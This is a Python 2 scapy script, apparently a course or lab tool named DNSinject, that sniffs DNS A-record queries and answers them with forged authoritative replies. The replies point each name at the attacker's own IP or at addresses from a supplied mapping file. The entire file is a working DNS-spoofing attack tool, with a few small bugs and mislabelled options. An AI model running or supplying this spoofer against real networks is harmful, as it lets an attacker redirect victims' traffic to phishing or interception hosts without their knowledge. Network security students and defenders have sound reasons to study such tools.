from scapy.all import *
import sys, getopt
import socket
host_ip_dict = {}
# To get the IP address of the machine
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('google.com', 0))
#print s.getsockname()[0]
def querysniff(pkt):
	global host_ip_dict
	spoofed_ip = s.getsockname()[0]   # gets the IP address of the machine
        if IP in pkt:
                ip_src = pkt[IP].src
                ip_dst = pkt[IP].dst
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 and pkt.getlayer(DNS).qd.qtype==1:
			#print pkt.summary()
			if pkt[DNS].qd.qname in host_ip_dict.keys():
				spoofed_ip = host_ip_dict[pkt[DNS].qd.qname]
			#print "Shravya " + spoofed_ip
			#print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                  	UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                  	DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                  	an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
			sendp(spoofed_pkt)
			#print str(pkt[IP].src) + " -> " + str(pkt[IP].dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"


def main(argv):
    global host_ip_dict
    interface = ''
    filename = ''
    expression = ''
    count=0
    
    try:
        opts, args = getopt.getopt(argv, 'i:f::')
    except getopt.GetoptError:
        print 'usage: python DNSinject.py -i <interface> <optional expression>'
        print '   or: python DNSinject.py -f <filename> <optional expression>'
        sys.exit()
    
    for opt, arg in opts:
        if opt == '-i':
            interface = arg
        elif opt == '-f':
            filename = arg
    
    if len(args) == 1:
        expression = args[0]
    elif len(args) > 1:
        print '\n\tExceeded limit\n'
        sys.exit()
    
    print '\n\tInitializing dnsinject using following parameters:\n',\
        '\t\tinterface:', interface, '\n',\
        '\t\tdata file:', filename, '\n',\
        '\t\texpression:', expression, '\n'
    
    if interface != '' and filename != '':
        print 'Please either interface OR file name!\n'
        sys.exit()
    elif interface == '' and filename == '':
        print '\tSniffing on all interfaces by default'
        sniff(prn = querysniff, filter = expression)
    elif interface != '' and filename == '':
        print '\tSniffing on interface', interface
        sniff(iface = interface, prn = querysniff, filter = expression)
    else:
        print '\tSniffing offline trace file', filename
	file=open(filename,'r')
	data=file.readlines()
	for line in data:
		#print line + "test"
        	words = line.split()
		if not words[1] in host_ip_dict.keys():
			host_ip_dict[words[1]] = words[0]
        sniff(prn = querysniff, filter = expression)
       

if __name__ == "__main__":
    main(sys.argv[1:])
